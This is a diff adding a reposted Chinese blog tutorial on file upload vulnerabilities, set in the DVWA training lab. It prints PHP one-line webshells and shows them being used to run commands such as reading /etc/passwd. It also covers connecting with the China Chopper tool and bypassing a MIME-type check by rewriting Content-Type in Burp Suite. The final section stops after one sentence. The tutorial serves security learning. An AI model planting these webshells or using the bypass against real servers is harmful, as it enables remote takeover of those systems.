@@ -1,0 +1,118 @@
+<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修文件上传漏洞' />
+<script src='../../highlight/highlight.pack.js'></script>
+<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>
+
+<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
+<script src='../../fenxiang/src/js/social-share.js'></script>
+<script src='../../fenxiang/src/js/qrcode.js'></script>
+
+</head><body><script>hljs.initHighlightingOnLoad();</script><script>
+var system ={};
+var p = navigator.platform;       
+system.win = p.indexOf('Win') == 0;  
+system.mac = p.indexOf('Mac') == 0;  
+system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
+if(system.win||system.mac||system.xll){
+document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
+</div><div onclick='hidden1()' >分享</div>
+</ul></div></div>
+<div id='heading_nav2'> 
+<li class='row' >
+<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>文件上传漏洞</center></div><div class='banquan'>原文出处:本文由博客园博主迷途小書童2019提供。<br/>
+原文连接:https://www.cnblogs.com/leeqizhi/p/11469634.html</div><br>
+    <ul>
+<li>
+<h2>前言</h2>
+</li>
+</ul>
+<p>文件上传漏洞就是在web前端对用户上传的文件没有做过滤，攻击者利用此漏洞上传webshell，因此可以远程操控服务器。</p>
+<ul>
+<li>
+<h2>webshell</h2>
+</li>
+</ul>
+<p>小马：一句话木马也称为小马，即整个shell代码只有一行，一般是系统执行函数<br />大马：代码量和功能比小马多，一般都会进行二次编码加密，防止被安全防火墙/入侵系统检测到</p>
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span>  <span style="color: #008000;">#</span><span style="color: #008000;">eval 使用php函数，例如phpinfo();</span>
+<span style="color: #008080;">2</span>    &lt;?php <span style="color: #0000ff;">eval</span>(<span style="color: #800080;">$_REQUEST</span>['cmd']);?&gt;
+<span style="color: #008080;">3</span>   http:<span style="color: #008000;">//</span><span style="color: #008000;">192.168.152.147/dvwa/hackable/uploads/webshell2.php?cmd=phpinfo();</span></code></pre>
+
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> <span style="color: #008000;">#</span><span style="color: #008000;">system 使用Linux系统命令，例如ls,cp,rm</span>
+<span style="color: #008080;">2</span> &lt;?php <span style="color: #008080;">system</span>(<span style="color: #800080;">$_request</span>['cmd']);?&gt;
+<span style="color: #008080;">3</span>   http:<span style="color: #008000;">//</span><span style="color: #008000;">192.168.152.147/dvwa/hackable/uploads/webshell3.php?cmd=cat /etc/passwd</span></code></pre>
+
+<ul>
+<li>
+<h2>中国菜刀</h2>
+</li>
+</ul>
+<pre class="wp-block-code"><code>说明request是在网页端输入变量访问，post则是使用中国菜刀之类的工具连接，是C/S架构</code><br /><br /></code></pre>
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> &lt;?php @<span style="color: #0000ff;">eval</span>(<span style="color: #800080;">$_post</span>['cmd']);?&gt;</code></pre>
+
+<ul>
+<li>
+<h2>环境部署</h2>
+</li>
+</ul>
+<p>本实例使用DVWA作为靶场，owasp官网已经将该环境打包成ova文件，直接下载安装即可。</p>
+<p>part 1。将dvwa安全级别设置为low。该级别对于上传的文件没有做限制，可以上传任意的文件。</p>
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span>  &lt;?php     <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">isset</span>(<span style="color: #800080;">$_POST</span>['Upload'])) {              <span style="color: #800080;">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";             <span style="color: #800080;">$target_path</span> = <span style="color: #800080;">$target_path</span> . <span style="color: #008080;">basename</span>(<span style="color: #800080;">$_FILES</span>['uploaded']['name']);             <span style="color: #800080;">$uploaded_name</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['name'];             <span style="color: #800080;">$uploaded_type</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['type'];             <span style="color: #800080;">$uploaded_size</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['size'];              <span style="color: #0000ff;">if</span> ((<span style="color: #800080;">$uploaded_type</span> == "image/jpeg") &amp;&amp; (<span style="color: #800080;">$uploaded_size</span> &lt; 100000)){                   <span style="color: #0000ff;">if</span>(!<span style="color: #008080;">move_uploaded_file</span>(<span style="color: #800080;">$_FILES</span>['uploaded']['tmp_name'], <span style="color: #800080;">$target_path</span>)) {                                      <span style="color: #0000ff;">echo</span> '&lt;pre&gt;';                     <span style="color: #0000ff;">echo</span> 'Your image was not uploaded.';                     <span style="color: #0000ff;">echo</span> '&lt;/pre&gt;';                                        } <span style="color: #0000ff;">else</span> {                                      <span style="color: #0000ff;">echo</span> '&lt;pre&gt;';                     <span style="color: #0000ff;">echo</span> <span style="color: #800080;">$target_path</span> . ' succesfully uploaded!';                     <span style="color: #0000ff;">echo</span> '&lt;/pre&gt;';                                          }             }             <span style="color: #0000ff;">else</span>{                 <span style="color: #0000ff;">echo</span> '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';             }         } ?&gt; </code></pre>
+
+<p>1、访问<a href="https://192.168.152.147/dvwa/vulnerabilities/upload/">https://192.168.152.147/dvwa/vulnerabilities/upload/</a>，选择【upload】，上传一句话木马。上传成功后提示文件上传成功并显示文件路径</p>
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> &lt;?php @<span style="color: #0000ff;">eval</span>(<span style="color: #800080;">$_POST</span>['caidao']);?&gt;</code></pre>
+
+<p><img src="./images/文件上传漏洞0.jpg" alt="" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;2、使用中国菜刀连接，如下图所示，输入一句话木马中的密码&rsquo;caidao&rsquo;</p>
+<p><img src="./images/文件上传漏洞1.jpg" alt="" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;右键选择文件管理，即可进入网站文件管理后台。</p>
+<p><img src="./images/文件上传漏洞2.jpg" alt="" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>part 2。将安全级别设置成medium。该级别对于上传的文件做了MIME（多用途互联网邮件扩展）限制，只能上传在Content-Type为image/jpeg类型文件。当上传PHP脚本文件时，浏览器将拒绝上传此文件到后台服务器，因此需要使用burpsuite来绕过此限制。</p>
+<p>查看文件源码。</p>
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span>  &lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;"> 2</span>     <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">isset</span>(<span style="color: #800080;">$_POST</span>['Upload'<span style="color: #000000;">])) {
+</span><span style="color: #008080;"> 3</span> 
+<span style="color: #008080;"> 4</span>             <span style="color: #800080;">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"<span style="color: #000000;">;
+</span><span style="color: #008080;"> 5</span>             <span style="color: #800080;">$target_path</span> = <span style="color: #800080;">$target_path</span> . <span style="color: #008080;">basename</span>(<span style="color: #800080;">$_FILES</span>['uploaded']['name'<span style="color: #000000;">]);
+</span><span style="color: #008080;"> 6</span>             <span style="color: #800080;">$uploaded_name</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['name'<span style="color: #000000;">];
+</span><span style="color: #008080;"> 7</span>             <span style="color: #800080;">$uploaded_type</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['type'<span style="color: #000000;">];
+</span><span style="color: #008080;"> 8</span>             <span style="color: #800080;">$uploaded_size</span> = <span style="color: #800080;">$_FILES</span>['uploaded']['size'<span style="color: #000000;">];
+</span><span style="color: #008080;"> 9</span> 
+<span style="color: #008080;">10</span>             <span style="color: #0000ff;">if</span> ((<span style="color: #800080;">$uploaded_type</span> == "image/jpeg") &amp;&amp; (<span style="color: #800080;">$uploaded_size</span> &lt; 100000<span style="color: #000000;">)){
+</span><span style="color: #008080;">11</span> 
+<span style="color: #008080;">12</span> 
+<span style="color: #008080;">13</span>                 <span style="color: #0000ff;">if</span>(!<span style="color: #008080;">move_uploaded_file</span>(<span style="color: #800080;">$_FILES</span>['uploaded']['tmp_name'], <span style="color: #800080;">$target_path</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">14</span>                 
+<span style="color: #008080;">15</span>                     <span style="color: #0000ff;">echo</span> '&lt;pre&gt;'<span style="color: #000000;">;
+</span><span style="color: #008080;">16</span>                     <span style="color: #0000ff;">echo</span> 'Your image was not uploaded.'<span style="color: #000000;">;
+</span><span style="color: #008080;">17</span>                     <span style="color: #0000ff;">echo</span> '&lt;/pre&gt;'<span style="color: #000000;">;
+</span><span style="color: #008080;">18</span>                     
+<span style="color: #008080;">19</span>                   } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;">20</span>                 
+<span style="color: #008080;">21</span>                     <span style="color: #0000ff;">echo</span> '&lt;pre&gt;'<span style="color: #000000;">;
+</span><span style="color: #008080;">22</span>                     <span style="color: #0000ff;">echo</span> <span style="color: #800080;">$target_path</span> . ' succesfully uploaded!'<span style="color: #000000;">;
+</span><span style="color: #008080;">23</span>                     <span style="color: #0000ff;">echo</span> '&lt;/pre&gt;'<span style="color: #000000;">;
+</span><span style="color: #008080;">24</span>                     
+<span style="color: #008080;">25</span> <span style="color: #000000;">                    }
+</span><span style="color: #008080;">26</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">27</span>             <span style="color: #0000ff;">else</span><span style="color: #000000;">{
+</span><span style="color: #008080;">28</span>                 <span style="color: #0000ff;">echo</span> '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'<span style="color: #000000;">;
+</span><span style="color: #008080;">29</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">30</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">31</span> ?&gt; </code></pre>
+
+<p>此处省去burpsuite的基本设置。上传文件前使用burp拦截数据包，此content-type改为image/jpeg，可以绕过此限制，将PHP文件上传到后台服务器，如图所示</p>
+<p><img src="./images/文件上传漏洞3.jpg" alt="" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;part3，将安全级别设置为high，此级别将会对上传的文件后缀名进行检验。</p>
+
+</div></div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>
